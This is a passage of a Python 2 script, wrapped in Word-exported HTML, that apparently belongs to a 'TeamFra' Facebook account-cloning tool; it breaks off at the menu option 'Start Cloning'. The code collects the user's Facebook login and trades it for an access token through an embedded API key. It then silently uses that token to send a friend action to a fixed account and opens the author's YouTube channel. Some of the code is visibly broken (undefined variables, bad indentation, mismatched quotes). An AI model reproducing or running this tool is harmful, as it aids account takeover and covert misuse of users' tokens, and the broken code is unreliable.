<py>

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=Generator content="Microsoft Word 14 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
	{font-family:"MS Gothic";
	panose-1:2 11 6 9 7 2 5 8 2 4;}
@font-face
	{font-family:"Cambria Math";
	panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
	{font-family:Calibri;
	panose-1:2 15 5 2 2 2 4 3 2 4;}
@font-face
	{font-family:"\@MS Gothic";
	panose-1:2 11 6 9 7 2 5 8 2 4;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
	{margin-top:0in;
	margin-right:0in;
	margin-bottom:10.0pt;
	margin-left:0in;
	line-height:115%;
	font-size:11.0pt;
	font-family:"Calibri","sans-serif";}
a:link, span.MsoHyperlink
	{color:blue;
	text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
	{color:purple;
	text-decoration:underline;}
.MsoChpDefault
	{font-family:"Calibri","sans-serif";}
.MsoPapDefault
	{margin-bottom:10.0pt;
	line-height:115%;}
@page WordSection1
	{size:8.5in 11.0in;
	margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
	{page:WordSection1;}
-->
</style>

</head>

<body lang=EN-US link=blue vlink=purple>

<div class=WordSection1>

<p class=MsoNormal>#!/usr/bin/python2</p>

<p class=MsoNormal>#coding=utf-8</p>

<p class=MsoNormal>#The Credit For This Code Goes To TeamFra</p>

<p class=MsoNormal>#If You Wanna Take Credits For This Code, Please Look
Yourself Again...</p>

<p class=MsoNormal>#Reserved2020</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>import
os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize</p>

<p class=MsoNormal>from multiprocessing.pool import ThreadPool</p>

<p class=MsoNormal>from requests.exceptions import ConnectionError</p>

<p class=MsoNormal>from mechanize import Browser</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>reload(sys)</p>

<p class=MsoNormal>sys.setdefaultencoding('utf8')</p>

<p class=MsoNormal>br = mechanize.Browser()</p>

<p class=MsoNormal>br.set_handle_robots(False)</p>

<p class=MsoNormal>br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)</p>

<p class=MsoNormal>br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera
Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def keluar():</p>

<p class=MsoNormal>                print &quot;\x1b[1;91mExit&quot;</p>

<p class=MsoNormal>                os.sys.exit()</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def acak(b):</p>

<p class=MsoNormal>    w = 'ahtdzjc'</p>

<p class=MsoNormal>    d = ''</p>

<p class=MsoNormal>    for i in x:</p>

<p class=MsoNormal>        d += '!'+w[random.randint(0,len(w)-1)]+i</p>

<p class=MsoNormal>    return cetak(d)</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def cetak(b):</p>

<p class=MsoNormal>    w = 'ahtdzjc'</p>

<p class=MsoNormal>    for i in w:</p>

<p class=MsoNormal>        j = w.index(i)</p>

<p class=MsoNormal>        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))</p>

<p class=MsoNormal>    x += '\033[0m'</p>

<p class=MsoNormal>    x = x.replace('!0','\033[0m')</p>

<p class=MsoNormal>    sys.stdout.write(x+'\n')</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def jalan(z):</p>

<p class=MsoNormal>                for e in z + '\n':</p>

<p class=MsoNormal>                                sys.stdout.write(e)</p>

<p class=MsoNormal>                                sys.stdout.flush()</p>

<p class=MsoNormal>                                time.sleep(0.07)</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>#Dev:Team_fra</p>

<p class=MsoNormal>##### LOGO #####</p>

<p class=MsoNormal>logo = &quot;&quot;&quot;</p>

<p class=MsoNormal>       \033[1;91m:<span style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9618;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>:</p>

<p class=MsoNormal>      \033[1;92m<span style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9608;&#9618;&#9608;&#9618;&#9608;&#9618;&#9618;&#9618;&#9608;&#9618;&#9608;&#9618;&#9608;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>::    
</p>

<p class=MsoNormal>     \033[1;93m:<span style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9618;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9618;&#9608;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>:::     
</p>

<p class=MsoNormal>    \033[1;94m::<span style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9608;&#9618;&#9618;&#9618;&#9608;&#9618;&#9608;&#9618;&#9608;&#9618;&#9618;&#9618;&#9608;&#9618;&#9608;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>::::     
</p>

<p class=MsoNormal>   \033[1;95m:::<span style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9608;&#9608;&#9608;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>:::::        
</p>

<p class=MsoNormal>  \033[1;96m::<span style='font-family:"MS Gothic"'>&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;</span>\033[1;91mWhatsapp\033[1;96m<span
style='font-family:"MS Gothic"'>&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9831;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>::::       
</p>

<p class=MsoNormal>  \033[1;91m:<span style='font-family:"MS Gothic"'>&#12299;&#12299;&#12299;</span>\033[1;93m+923157691248\033[1;91m<span
style='font-family:"MS Gothic"'>&#12298;&#12298;&#12298;</span><span
style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;&#9618;</span>:::::</p>

<p class=MsoNormal>\033[1;95m<span style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9581;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9582;&#9825;</span>\033[1;96m-TeamFra-\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9581;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9582;&#9825;</span></p>

<p class=MsoNormal>\033[1;92m..........................TeamFra......................</p>

<p class=MsoNormal>\033[1;93m<span style='font-family:"Arial","sans-serif"'>&#9556;&#9559;</span>
<span style='font-family:"Arial","sans-serif"'>&#9556;&#9559;&#9556;&#9552;&#9574;&#9574;&#9574;&#9552;&#9559;</span>
<span style='font-family:"Arial","sans-serif"'>&#9556;&#9559;&#9556;&#9574;&#9552;&#9574;&#9574;&#9559;</span></p>

<p class=MsoNormal>\033[1;93m<span style='font-family:"Arial","sans-serif"'>&#9553;&#9553;</span>
<span style='font-family:"Arial","sans-serif"'>&#9553;&#9562;&#9571;&#9553;&#9553;&#9553;&#9553;&#9577;&#9571;</span>
<span style='font-family:"Arial","sans-serif"'>&#9562;&#9559;&#9556;&#9571;&#9553;&#9553;&#9553;&#9553;</span>  
Pakistan</p>

<p class=MsoNormal>\033[1;93m<span style='font-family:"Arial","sans-serif"'>&#9562;&#9565;</span>
<span style='font-family:"Arial","sans-serif"'>&#9562;&#9552;&#9577;&#9552;&#9577;&#9552;&#9577;&#9552;&#9565;&#9552;</span>
<span style='font-family:"Arial","sans-serif"'>&#9562;&#9565;&#9562;&#9552;&#9577;&#9552;&#9565;</span>
</p>

<p class=MsoNormal>\033[1;95m<span style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9584;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9583;&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9584;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9583;&#9825;</span>&quot;&quot;&quot;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def tik():</p>

<p class=MsoNormal>                titik = ['.   ','..  ','... ']</p>

<p class=MsoNormal>                for o in titik:</p>

<p class=MsoNormal>                                print(&quot;\r\x1b[1;93mPlease
Wait \x1b[1;93m&quot;+o),;sys.stdout.flush();time.sleep(1)</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>back = 0</p>

<p class=MsoNormal>berhasil = []</p>

<p class=MsoNormal>cekpoint = []</p>

<p class=MsoNormal>oks = []</p>

<p class=MsoNormal>id = []</p>

<p class=MsoNormal>listgrup = []</p>

<p class=MsoNormal>vulnot = &quot;\033[31mNot Vuln&quot;</p>

<p class=MsoNormal>vuln = &quot;\033[32mVuln&quot;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>os.system(&quot;clear&quot;)</p>

<p class=MsoNormal>print  &quot;&quot;&quot;</p>

<p class=MsoNormal>  \033[1;96m-<span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9585;&#9620;&#9620;&#9620;&#9620;&#9586;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>        
</p>

<p class=MsoNormal>  \033[1;96m<span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9621;&#9621;&#9586;&#9482;&#9482;&#9585;&#9615;&#9615;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>       
</p>

<p class=MsoNormal>  \033[1;96m<span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9621;&#9621;&#9602;&#9585;&#9586;&#9602;&#9615;&#9615;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>  
</p>

<p class=MsoNormal> \033[1;96m <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9586;&#9482;&#9482;&#9482;&#9482;&#9585;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>  
</p>

<p class=MsoNormal> \033[1;96m <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9621;&#9586;&#9602;&#9602;&#9585;&#9615;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span></p>

<p class=MsoNormal> \033[1;96m <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9585;&#9620;&#9620;&#9620;&#9620;&#9482;&#9482;&#9482;&#9482;&#9620;&#9620;&#9620;&#9620;&#9586;&#9480;&#9480;&#9480;&#9480;</span></p>

<p class=MsoNormal>  \033[1;96m
&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472; 
</p>

<p class=MsoNormal>   \033[1;92m<span style='font-family:"Arial","sans-serif"'>&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9618;&#9618;</span>Welcome
To TeamFra<span style='font-family:"Arial","sans-serif"'>&#9618;&#9618;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;</span></p>

<p class=MsoNormal>\033[1;95m<span style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9581;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9582;&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9581;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9582;&#9825;</span></p>

<p class=MsoNormal>\033[1;94mAuthor\033[1;91m: \033[1;91mTeamfra</p>

<p class=MsoNormal>\033[1;94mTeamfra\033[1;91m: \033[1;91<span
style='font-family:"Arial","sans-serif"'>&#9618;&#9619;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;&#9608;</span>]99.9</p>

<p class=MsoNormal>\033[1;94mFacebook\033[1;91m: \033[1;91teamfra</p>

<p class=MsoNormal>\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923157691248</p>

<p class=MsoNormal>\033[1;95m<span style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9584;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9583;&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9584;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9583;&#9825;</span>&quot;&quot;&quot;</p>

<p class=MsoNormal>jalan('              \033[1;96m....................TeamFra.....................:')</p>

<p class=MsoNormal>jalan(&quot;\033[1;93m   <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9585;&#9620;&#9620;&#9620;&#9620;&#9586;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>  
&quot;)</p>

<p class=MsoNormal>jalan('\033[1;93m   <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9621;&#9621;&#9586;&#9482;&#9482;&#9585;&#9615;&#9615;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>  
')</p>

<p class=MsoNormal>jalan('\033[1;93m   <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9621;&#9621;&#9602;&#9585;&#9586;&#9602;&#9615;&#9615;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>  
')</p>

<p class=MsoNormal>jalan(&quot;\033[1;93m   <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9586;&#9482;&#9482;&#9482;&#9482;&#9585;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>
&quot;)</p>

<p class=MsoNormal>jalan(&quot;\033[1;93m   <span style='font-family:"MS Gothic"'>&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9621;&#9586;&#9602;&#9602;&#9585;&#9615;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;&#9480;</span>&quot;)</p>

<p class=MsoNormal>print &quot;\033[1;93m<span style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9585;&#9620;&#9620;&#9620;&#9620;&#9482;&#9482;&#9482;&#9482;&#9620;&#9620;&#9620;&#9620;&#9586;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mLogin
TeamFra\033[1;95m<span style='font-family:"Cambria Math","serif"'>&#9825;</span><span
style='font-family:"MS Gothic"'>&#9584;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"MS Gothic"'>&#9583;&#9825;</span>&quot;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>CorrectUsername = &quot;TeamFra&quot;</p>

<p class=MsoNormal>CorrectPassword = &quot;Owner&quot;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>loop = 'true'</p>

<p class=MsoNormal>while (loop == 'true'):</p>

<p class=MsoNormal>    username = raw_input(&quot;\033[1;91m&#128272;
\x1b[1;91mTool Username \x1b[1;91m»» \x1b[1;93m&quot;)</p>

<p class=MsoNormal>    if (username == CorrectUsername):</p>

<p class=MsoNormal>                password = raw_input(&quot;\033[1;94m&#128272;
\x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m&quot;)</p>

<p class=MsoNormal>        if (password == CorrectPassword):</p>

<p class=MsoNormal>            print &quot;Logged in successfully as &quot; +
username #Dev:Team_fra</p>

<p class=MsoNormal>                    time.sleep(2)</p>

<p class=MsoNormal>            loop = 'false'</p>

<p class=MsoNormal>        else:</p>

<p class=MsoNormal>            print &quot;\033[1;91mWrong Password&quot;</p>

<p class=MsoNormal>            os.system('xdg-open https://m<a
href="https://www.youtube.com/channel/UCjyFIyzo3YFnPlrmn8XbbTA">.youtube.com/channel/UCjyFIyzo3YFnPlrmn8XbbTA</a>’)</p>

<p class=MsoNormal>    else:</p>

<p class=MsoNormal>        print &quot;\033[1;94mWrong Username&quot;</p>

<p class=MsoNormal style='margin-bottom:0in;margin-bottom:.0001pt;line-height:
normal;text-autospace:none'>        os.system('xdg-open https://m<a
href="https://www.youtube.com/channel/UCjyFIyzo3YFnPlrmn8XbbTA">.youtube.com/channel/UCjyFIyzo3YFnPlrmn8XbbTA</a>’)</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def login():</p>

<p class=MsoNormal>                os.system('clear')</p>

<p class=MsoNormal>                try:</p>

<p class=MsoNormal>                                toket =
open('login.txt','r')</p>

<p class=MsoNormal>                                menu() </p>

<p class=MsoNormal>                except (KeyError,IOError):</p>

<p class=MsoNormal>                                os.system('clear')</p>

<p class=MsoNormal>                                print logo</p>

<p class=MsoNormal>                                jalan(' \033[1;92mWarning:
\033[1;97mDo Not Use Your Personal Account' )</p>

<p class=MsoNormal>                                jalan(' \033[1;92m   Note:
\033[1;97mUse a New Account To Login' )</p>

<p class=MsoNormal>                                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&quot;</p>

<p class=MsoNormal>                                print('       \033[1;94m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\x1b[1;91m<span
style='font-family:"MS Gothic"'>&#12299;&#12299;&#12299;&#12299;&#12299;&#12299;</span>LOGIN
WITH FACEBOOK<span style='font-family:"MS Gothic"'>&#12298;&#12298;&#12298;&#12298;&#12298;&#12298;</span>\x1b[1;94m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>' )</p>

<p class=MsoNormal>                                print('    ' )</p>

<p class=MsoNormal>                                id =
raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')</p>

<p class=MsoNormal>                                pwd =
raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;96m: \x1b[1;96m')</p>

<p class=MsoNormal>                                tik()</p>

<p class=MsoNormal>                                try:</p>

<p class=MsoNormal>                                                br.open('https://m.facebook.com')</p>

<p class=MsoNormal>                                except mechanize.URLError:</p>

<p class=MsoNormal>                                                print&quot;\n\x1b[1;96mThere
is no internet connection&quot;</p>

<p class=MsoNormal>                                                keluar()</p>

<p class=MsoNormal>                                br._factory.is_html = True</p>

<p class=MsoNormal>                                br.select_form(nr=0)</p>

<p class=MsoNormal>                                br.form['email'] = id</p>

<p class=MsoNormal>                                br.form['pass'] = pwd</p>

<p class=MsoNormal>                                br.submit()</p>

<p class=MsoNormal>                                url = br.geturl()</p>

<p class=MsoNormal>                                if 'save-device' in url:</p>

<p class=MsoNormal>                                                try:</p>

<p class=MsoNormal>                                                                sig=
'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'</p>

<p class=MsoNormal>                                                                data
=
{&quot;api_key&quot;:&quot;882a8490361da98702bf97a021ddc14d&quot;,&quot;credentials_type&quot;:&quot;password&quot;,&quot;email&quot;:id,&quot;format&quot;:&quot;JSON&quot;,
&quot;generate_machine_id&quot;:&quot;1&quot;,&quot;generate_session_cookies&quot;:&quot;1&quot;,&quot;locale&quot;:&quot;en_US&quot;,&quot;method&quot;:&quot;auth.login&quot;,&quot;password&quot;:pwd,&quot;return_ssl_resources&quot;:&quot;0&quot;,&quot;v&quot;:&quot;1.0&quot;}</p>

<p class=MsoNormal>                                                                x=hashlib.new(&quot;md5&quot;)</p>

<p class=MsoNormal>                                                                x.update(sig)</p>

<p class=MsoNormal>                                                                a=x.hexdigest()</p>

<p class=MsoNormal>                                                                data.update({'sig':a})</p>

<p class=MsoNormal>                                                                url
= &quot;https://api.facebook.com/restserver.php&quot;</p>

<p class=MsoNormal>                                                                r=requests.get(url,params=data)</p>

<p class=MsoNormal>                                                                z=json.loads(r.text)</p>

<p class=MsoNormal>                                                                unikers
= open(&quot;login.txt&quot;, 'w')</p>

<p class=MsoNormal>                                                                unikers.write(z['access_token'])</p>

<p class=MsoNormal>                                                                unikers.close()</p>

<p class=MsoNormal>                                                                print
'\n\x1b[1;95mLogin Successful...'</p>

<p class=MsoNormal>                                                                os.system('xdg-open</p>

<p class=MsoNormal>https://m <a
href="https://www.youtube.com/channel/UCjyFIyzo3YFnPlrmn8XbbTA">.youtube.com/channel/UCjyFIyzo3YFnPlrmn8XbbTA</a>’)</p>

<p class=MsoNormal>  </p>

<p class=MsoNormal>                                                                requests.post('https://graph.facebook.com/me/friends?method=post&amp;uids=gwimusa3&amp;access_token='+z['access_token'])</p>

<p class=MsoNormal>                                                                menu()</p>

<p class=MsoNormal>                                                except
requests.exceptions.ConnectionError:</p>

<p class=MsoNormal>                                                                print&quot;\n\x1b[1;91mThere
is no internet connection&quot;</p>

<p class=MsoNormal>                                                                keluar()</p>

<p class=MsoNormal>                                if 'checkpoint' in url:</p>

<p class=MsoNormal>                                                print(&quot;\n\x1b[1;92mYour
Account is on Checkpoint&quot;)</p>

<p class=MsoNormal>                                                os.system('rm
-rf login.txt')</p>

<p class=MsoNormal>                                                time.sleep(1)</p>

<p class=MsoNormal>                                                keluar()</p>

<p class=MsoNormal>                                else:</p>

<p class=MsoNormal>                                                print(&quot;\n\x1b[1;93mPassword/Email
is wrong&quot;)</p>

<p class=MsoNormal>                                                os.system('rm
-rf login.txt')</p>

<p class=MsoNormal>                                                time.sleep(1)</p>

<p class=MsoNormal>                                                login()</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>&nbsp;</p>

<p class=MsoNormal>def menu():</p>

<p class=MsoNormal>                os.system('clear')</p>

<p class=MsoNormal>                try:</p>

<p class=MsoNormal>                                toket=open('login.txt','r').read()</p>

<p class=MsoNormal>                except IOError:</p>

<p class=MsoNormal>                                os.system('clear')</p>

<p class=MsoNormal>                                print&quot;\x1b[1;91mToken
invalid&quot;</p>

<p class=MsoNormal>                                os.system('rm -rf
login.txt')</p>

<p class=MsoNormal>                                time.sleep(1)</p>

<p class=MsoNormal>                                login()</p>

<p class=MsoNormal>                try:</p>

<p class=MsoNormal>                                otw = requests.get('https://graph.facebook.com/me?access_token='+toket)</p>

<p class=MsoNormal>                                a = json.loads(otw.text)</p>

<p class=MsoNormal>                                nama = a['name']</p>

<p class=MsoNormal>                                id = a['id']</p>

<p class=MsoNormal>                except KeyError:</p>

<p class=MsoNormal>                                os.system('clear')</p>

<p class=MsoNormal>                                print&quot;\033[1;91mYour
Account is on Checkpoint&quot;</p>

<p class=MsoNormal>                                os.system('rm -rf
login.txt')</p>

<p class=MsoNormal>                                time.sleep(1)</p>

<p class=MsoNormal>                                login()</p>

<p class=MsoNormal>                except requests.exceptions.ConnectionError:</p>

<p class=MsoNormal>                                print&quot;\x1b[1;92mThere
is no internet connection&quot;</p>

<p class=MsoNormal>                                keluar()</p>

<p class=MsoNormal>                os.system(&quot;clear&quot;) #Dev:Team_fra</p>

<p class=MsoNormal>                print logo</p>

<p class=MsoNormal>                print &quot;  \033[1;95m«-----<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>----\033[1;93mLogged
in User Info\033[1;95m----<span style='font-family:"Cambria Math","serif"'>&#9825;</span>-----»&quot;</p>

<p class=MsoNormal>                print &quot;      \033[1;94m
Name\033[1;93m:\033[1;92m&quot;+nama+&quot;\033[1;97m               &quot;</p>

<p class=MsoNormal>                print &quot;      \033[1;97m
ID\033[1;93m:\033[1;92m&quot;+id+&quot;\x1b[1;97m              &quot;</p>

<p class=MsoNormal>                print &quot;\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>\033[1;96mTeamFra\033[1;95m<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;•<span
style='font-family:"MS Gothic"'>&#9672;</span>•&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;<span
style='font-family:"Cambria Math","serif"'>&#9825;</span>&quot;</p>

<p class=MsoNormal>                print &quot;\033[1;97m--\033[1;92m&gt;
\033[1;92m1.\x1b[1;92mStart Cloning...&quot;</p>

<p class=MsoNormal>                print &quot;\033[1;97m--\033[1;91m&gt;
